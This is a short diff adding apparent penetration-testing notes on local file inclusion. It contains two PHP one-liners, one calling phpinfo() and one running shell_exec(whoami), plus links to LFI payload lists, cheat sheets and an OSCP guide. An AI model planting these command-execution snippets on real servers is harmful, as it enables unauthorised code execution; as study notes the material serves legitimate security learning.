@@ -1,0 +1,8 @@
+<?php phpinfo()?>
+<?php echo shell_exec(whoami);?>
+
+https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI
+https://sushant747.gitbooks.io/total-oscp-guide/local_file_inclusion.html
+https://highon.coffee/blog/lfi-cheat-sheet/#procselffd-lfi-method
+https://gist.github.com/rshipp/eee36684db07d234c1cc
+http://www.fuzzysecurity.com/scripts/16.html
